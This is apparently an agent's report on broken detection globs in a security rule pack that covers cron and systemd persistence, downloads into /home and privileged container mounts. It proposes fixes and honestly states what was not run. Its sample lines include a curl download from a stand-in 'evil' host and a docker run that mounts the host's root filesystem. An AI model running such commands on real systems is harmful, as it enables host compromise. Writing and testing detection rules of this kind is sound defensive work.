# FINDING 2026-10-23 — the globs are broken, the matcher is not (and I proposed the wrong fix twice)

Follows `FINDING-2026-10-23-dead-globs.md` (4 globs in `rules/carbonato.yaml` cannot fire) and
`docs/FINDING-2026-10-23-INDEX.md`. Report only — `rules/` and `internal/` untouched.

## What I set out to test

Yesterday's finding offered a fix and flagged it as a design decision: rewrite
`*/etc/cron*` → `*/etc/cron*/*`. I could not measure it. This heartbeat I tried the cheaper
alternative first: **do not touch the globs, widen the matcher.** Keep the author's English and add
one candidate shape — *token-boundary runs*, sub-slices of the argv string whose boundaries fall on
`/` and `.`, so `*/etc/cron*` can match `/etc/cron` and let `*` eat `.d`.

That idea needed a module and a test, so it got both: `scripts/tokruns.py` and
`scripts/tokruns_test.py` (**5/5**). The test's own sharpest clause is the one that keeps it honest —
a run candidate only counts if **`path.Match` itself** accepts it, never `match_one`'s
suffix/basename/contains fallbacks. Otherwise the fallback would do the rescuing and the "boundary
rule" would pass for the wrong reason.

## Result 1 — the matcher idea is a NO, measured

`scripts/sigprobe.py` runs both matchers over the corpus and over the pack's own sample tables.

- runs rescue **1** glob out of 39 (`*/etc/cron*`) — of 4 that were dead, 24 counting every glob
  no corpus line fires.
- **0** quiet lines added — so it is not a noise problem either. It simply buys ~nothing.

One rescue for a new matcher concept. The matcher is not what is broken. **The globs are.** Altered
ladder: step "widen the matcher" is withdrawn before it reached a proposal.

## Result 2 — four specific fixes, each proved on the pack's own samples

`sigprobe` proposes a corrected spelling per dead glob and asserts two clauses, both required:
fires on at least one sample of its rule (`SAMPLES` from `packcheck`), **and** adds no `quiet` corpus
line that the old glob did not already fire. 4/4 satisfied both:

| rule | dead glob | proposed | fires on |
|---|---|---|---|
| `persist.cron_or_rc` | `*/etc/cron*` | `*/etc/cron*/*` | 2/9 |
| `persist.cron_or_rc` | `*/etc/systemd/system*` | `*/etc/systemd/system/*` | 1/9 |
| `tool.package_install` | `* -O /home/*` | `*-O /home/*/*` | 1/10 |
| `infra.privileged_container` | `*-v /*:/` | `*/:/*` | 1/4 |

Note the last one is not the "same glob plus a star" shape the first three share, and it is the one
I am least sure about — see below.

## What the fix pass taught me, in order

**I was wrong about `* -O /home/*` and about the hyphen.** `* -O /home/*` has a space *before* `-O`.
Against `curl http://evil/x -O /home/u/x` it fails not because of the space but because `*` cannot
cross a `/`: one trailing `/*` segment cannot carry `vivi/x`. The fix needs a **second** segment
(`*-O /home/*/*`), and it must lose the space at the same time. Two independent defects in one glob.

**My first `privileged_container` "fix" was `*-v /*:*`, and it fired on nothing.** Rewriting the
trailing colon to a wildcard does not help: `path.Match` still cannot cross the `/` inside the mount
spec, so `-v /:/host` never matches regardless of what follows the colon.

**My second one, `*/:/*`, passes the two clauses and is still weak.** Measured separately:

```
*/:/*   docker run -v /:/host          -> True    (the sample)
*/:/*   docker run -v /data:/data      -> False   (good: silent on a data mount)
*/:/*   docker run -v /etc:/host/etc   -> False   (BAD: a host dir onto a host path is missed)
```

It is anchored on the literal `/:` rather than on "a bind mount whose destination is a host path".
So the honest status of this one is **fixed for the sample, not fixed for the class** — and the real
fix is the two-field `argv_any` decision already open (match source and destination separately,
`:` as a separator), not a cleverer single glob.

## Files

- `scripts/tokruns.py` — the boundary rule (pure, no I/O), `runs()` / `argv_runs()`.
- `scripts/tokruns_test.py` — 5/5: rescue, counter-case, dot boundary, `*` still can't cross `/`,
  whole string excluded.
- `scripts/sigprobe.py` — both measurements above; exit 0 only if every dead glob has a fix that
  satisfies **both** clauses.
- `scripts/packcheck.py`, `packcheck_test.sh` — unchanged, 4/4.

Guards this heartbeat: `packcheck_test` 4/4, `flagprobe_test` 5/5, `crossprobe_test` 5/5,
`subjectprobe_test` 4/4, `tokruns_test` 5/5, `check-links` ok (108 links). No Go: `go`, `make`,
`gofmt` absent on this host, so nothing here has been run against the engine, and `make test` /
`make preflight` could not run and are **not** claimed.

## What I did not do

Did not patch the pack. Three of the four proposals are one-line spellings a pack owner can review
in a minute, and the fourth needs the `argv_any` decision first. Shipping a changed glob without a
Go run would be the exact sin this whole thread documents.

**Superseding note (added later the same day):** `FINDING-2026-10-23-retraction.md` outranks this file's
priority list — five path/endpoint rules are broken, one critical, and that comes before any glob spelling.

**Recommended next step:** the `argv_any` two-field split — it is now the blocker for both the
`privileged_container` mount class and the `| sh` / phrase globs, which are a whole family of
"glob names a phrase" defects that no amount of glob spelling will fix.

Vivi 🌺 — 2026-10-23
